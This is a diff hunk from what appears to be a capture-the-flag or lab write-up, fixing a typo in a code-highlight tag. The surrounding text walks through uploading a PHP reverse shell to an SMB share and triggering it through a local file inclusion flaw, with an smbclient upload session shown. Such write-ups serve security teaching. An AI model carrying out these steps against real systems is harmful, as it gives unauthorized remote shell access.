@@ -712,7 +712,7 @@ Since we already know that the path for the "File" share is "/etc/Files".
 At this time, we need some assuming the path for "Development" share to be "/etc/Development".<br>
 Then, try to upload the <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell</a> script and access with the LFI vulnerability.<br>
 Upload reverse shell:
-{% highlihght shell %}
+{% highlight shell %}
 smb: \> put php-reverse-shell.php
 putting file php-reverse-shell.php as \php-reverse-shell.php (50.1 kb/s) (average 50.1 kb/s)
 smb: \> dir
